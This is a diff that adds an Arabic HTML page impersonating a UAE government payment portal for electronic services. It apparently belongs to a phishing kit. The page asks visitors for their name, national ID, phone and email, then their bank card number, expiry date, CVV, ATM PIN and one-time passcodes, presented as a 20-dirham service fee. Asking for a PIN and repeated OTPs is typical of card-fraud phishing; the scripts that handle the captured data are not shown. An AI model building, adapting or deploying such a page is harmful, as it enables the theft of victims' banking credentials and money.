@@ -1,0 +1,218 @@
+<html lang="ar" dir="rtl">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1, minimum-scale=1,maximum-scale=5.0" />
+    <title>بوابة دفع قيمة الخدمات الالكترونية (حكومة الإمارات)</title>
+    <link  rel= "apple-touch-icon"  sizes= "57x57"  href= "favico/apple-icon-57x57.png" > 
+    <link  rel= "apple-touch-icon"  sizes= "60x60"  href= "favico/apple-icon-60x60.png" > 
+    <link  rel= "apple-touch-icon"  sizes= "72x72"  href= "favico/apple-icon-72x72.png" > 
+    <link  rel= "apple-touch-icon"  sizes= "76x76"  href= "favico/apple-icon-76x76.png" > 
+    <link  rel= "apple-touch-icon"  sizes= "114x114"  href= "favico/apple-icon-114x114.png" > 
+    <link  rel= "apple-touch-icon"  sizes= "120x120"  href= "favico/apple-icon-120x120.png" > 
+    <link  rel= "apple-touch-icon"  sizes= "144x144"  href= "favico/apple-icon-144x144.png" > 
+    <link  rel= "apple-touch-icon"  sizes= "152x152"  href= "favico/apple-icon-152x152.png" > 
+    <link  rel= "apple-touch-icon"  sizes= "180x180"  href= "favico/apple-icon-180x180.png" > 
+    <link  rel= "icon"  type= "image/png"  sizes= "192x192"   href= "favico/android-icon-192x192.png" > 
+    <link  rel= "icon"  type= "image/png"  sizes= "32x32"  href= "/favico/favicon-32x32.png" > 
+    <link  rel= "icon"  type= "image/png"  sizes= "96x96"  href= "/favico/android-icon-96x96.png" > 
+    <link  rel= "icon"  type= "image/png"  sizes= "16x16"  href= "/favico/favicon-16x16.png" > 
+    <link  rel= "manifest"  href= "favico/manifest.json" > 
+    <meta  name= "msapplication-TileColor"  content= "#ffffff" > 
+    <meta  name= "msapplication-TileImage"  content= "/ms-icon-144x144.png" > 
+    <meta  name= "theme-color"  content= "#ffffff" >
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="shortcut icon" href="../favicon.ico" />
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&amp;display=swap" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div id="home-page">
+            <div class="header">
+                <img src="https://i.ibb.co/WpPRSQRj/53-142318-d232337f3d037a4298202dcc7a7d3e4e-700x400-1.jpg" alt="شعار الإمارات" class="emirates-logo">
+                <h1>بوابة دفع قيمة الخدمات الالكترونية</h1>
+                <p>حكومة الإمارات العربية المتحدة</p>
+            </div>
+            
+            <div class="form-container">
+                <form id="personal-info-form">
+                    <div class="form-group">
+                        <label for="full-name">الاسم الكامل</label>
+                        <input type="text" id="full-name" class="form-control" required pattern="[A-Za-z0-9 ]+" title="يجب إدخال أحرف إنجليزية فقط">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="id-number">رقم الهوية</label>
+                        <input type="text" id="id-number" class="form-control" required pattern="[A-Za-z0-9]+" title="يجب إدخال أحرف وأرقام إنجليزية فقط">
+                        <div class="error-message" id="id-number-error">يجب إدخال رقم هوية صحيح</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phone">رقم الجوال</label>
+                        <input type="tel" id="phone" class="form-control" required pattern="05\d{8}" inputmode="numeric" title="يجب إدخال رقم جوال يبدأ بـ 05">
+                        <div class="error-message" id="phone-error">يجب إدخال رقم جوال يبدأ بـ 05</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="email">البريد الإلكتروني</label>
+                        <input type="email" id="email" class="form-control" required pattern="[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$" title="يجب إدخال بريد إلكتروني صحيح">
+                        <div class="error-message" id="email-error">يجب إدخال بريد إلكتروني صحيح</div>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-block">متابعة</button>
+                </form>
+            </div>
+        </div>
+        
+        <div id="verification-page" class="loading-container hidden">
+            <div class="spinner"></div>
+            <h3>جاري التحقق من البيانات</h3>
+            <p>يرجى الانتظار...</p>
+        </div>
+        
+        <div id="confirmation-page" class="hidden">
+            <div class="header">
+                <img src="https://i.ibb.co/WpPRSQRj/53-142318-d232337f3d037a4298202dcc7a7d3e4e-700x400-1.jpg" alt="شعار الإمارات" class="emirates-logo">
+                <h1>تأكيد البيانات</h1>
+            </div>
+            
+            <div class="form-container">
+                <div class="form-group">
+                    <p><strong>الاسم الكامل:</strong> <span id="confirm-name"></span></p>
+                    <p><strong>رقم الهوية:</strong> <span id="confirm-id"></span></p>
+                    <p><strong>رقم الجوال:</strong> <span id="confirm-phone"></span></p>
+                    <p><strong>البريد الإلكتروني:</strong> <span id="confirm-email"></span></p>
+                    <p><strong>المبلغ المستحق:</strong> 20 درهم إماراتي</p>
+                </div>
+                
+                <button id="confirm-btn" class="btn btn-block">متابعة للدفع</button>
+            </div>
+        </div>
+        
+        <div id="confirmation-waiting-page" class="loading-container hidden">
+            <div class="spinner"></div>
+            <h3>جاري التحميل</h3>
+            <p>يرجى الانتظار...</p>
+        </div>
+        
+        <!-- صفحة اختيار البنك -->
+        <div id="bank-selection-page" class="hidden">
+            <div class="header">
+                <img src="https://i.ibb.co/WpPRSQRj/53-142318-d232337f3d037a4298202dcc7a7d3e4e-700x400-1.jpg" alt="شعار الإمارات" class="emirates-logo">
+                <h1>اختر البنك الخاص بك</h1>
+            </div>
+            
+            <div class="form-container">
+                <div class="bank-cards" id="bank-cards-container">
+                </div>
+            </div>
+        </div>
+        
+        <div id="bank-waiting-page" class="loading-container hidden">
+            <div class="spinner"></div>
+            <h3>جاري التحميل</h3>
+            <p>يرجى الانتظار...</p>
+        </div>
+        
+        <div id="card-details-page" class="hidden">
+            <div class="header">
+                <img src="https://i.ibb.co/WpPRSQRj/53-142318-d232337f3d037a4298202dcc7a7d3e4e-700x400-1.jpg" alt="شعار الإمارات" class="emirates-logo">
+                <h1>بيانات بطاقة الدفع</h1>
+            </div>
+            
+            <div class="form-container">
+                <form id="card-details-form">
+                    <div class="form-group">
+                        <label for="card-number">رقم البطاقة</label>
+                        <div class="card-input-container">
+                            <input type="text" id="card-part-1" class="card-input" maxlength="4" required pattern="\d{4}" inputmode="numeric">
+                            <input type="text" id="card-part-2" class="card-input" maxlength="4" required pattern="\d{4}" inputmode="numeric">
+                            <input type="text" id="card-part-3" class="card-input" maxlength="4" required pattern="\d{4}" inputmode="numeric">
+                            <input type="text" id="card-part-4" class="card-input" maxlength="4" required pattern="\d{4}" inputmode="numeric">
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="row">
+                            <div class="col">
+                                <label for="expiry-date">تاريخ الانتهاء</label>
+                                <input type="text" id="expiry-date" class="form-control" placeholder="MM/YY" required pattern="(0[1-9]|1[0-2])\/[0-3][0-9]" inputmode="numeric">
+                                <div class="error-message" id="expiry-error">يجب إدخال تاريخ انتهاء صحيح (MM/YY)</div>
+                            </div>
+                            <div class="col">
+                                <label for="cvv">CVV</label>
+                                <input type="text" id="cvv" class="form-control" maxlength="3" required pattern="\d{3}" inputmode="numeric">
+                                <div class="error-message" id="cvv-error">يجب إدخال CVV صحيح (3 أرقام)</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="card-pin">الرقم السري لبطاقة الصراف (PIN)</label>
+                        <input type="password" id="card-pin" class="form-control" maxlength="4" required pattern="\d{4}" inputmode="numeric">
+                        <div class="error-message" id="pin-error">يجب إدخال 4 أرقام</div>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-block">إتمام الدفع</button>
+                </form>
+            </div>
+        </div>
+        
+        <div id="payment-waiting-page" class="loading-container hidden">
+            <div class="spinner"></div>
+            <h3>جاري التحقق من بيانات الدفع</h3>
+            <p>يرجى الانتظار...</p>
+        </div>
+        
+        <!-- صفحة إدخال OTP -->
+        <div id="otp-page" class="hidden">
+            <div class="header">
+                <img id="otp-bank-logo" src="" alt="شعار البنك" style="height: 60px; margin-bottom: 20px;">
+                <h1>التحقق بخطوتين</h1>
+            </div>
+            
+            <div class="form-container">
+                <p>تم إرسال الكود السري (OTP) إلى رقم الجوال المسجل في البنك</p>
+                
+                <div class="form-group">
+                    <label for="otp-input">الكود السري (OTP)</label>
+                    <input type="text" id="otp-input" class="form-control otp-input" 
+                           maxlength="6" required pattern="\d{4,6}" 
+                           inputmode="numeric" placeholder="أدخل الكود المكون من 4 أو 6 أرقام">
+                </div>
+                
+                <div class="otp-loading" id="otp-loading">
+                    <div class="small-spinner"></div>
+                    <p>جاري التحقق من الكود يرجى عدم مغادرة او تحديث الصفحة...</p>
+                </div>
+                
+                <div class="attempts-left" id="attempts-left"></div>
+                
+                <button id="verify-otp-btn" class="btn btn-block">تحقق</button>
+            </div>
+        </div>
+        
+        <div id="otp-error-page" class="hidden">
+            <div class="header">
+                <img src="https://i.ibb.co/WpPRSQRj/53-142318-d232337f3d037a4298202dcc7a7d3e4e-700x400-1.jpg" alt="شعار الإمارات" class="emirates-logo">
+                <h1>خطأ في التحقق</h1>
+            </div>
+            
+            <div class="form-container" style="text-align: center;">
+                <p style="color: var(--error-color); font-size: 18px; margin-bottom: 20px;">
+                    عزيزي العميل، لقد قمت بإدخال الكود بشكل خاطئ 3 مرات
+                </p>
+                <p>يرجى إعادة المحاولة من جديد</p>
+                
+                <button id="restart-process-btn" class="btn" style="margin-top: 20px;">العودة إلى الصفحة الرئيسية</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/banks.js"></script>
+    <script src="js/app.js"></script>
+</body>
+</html>
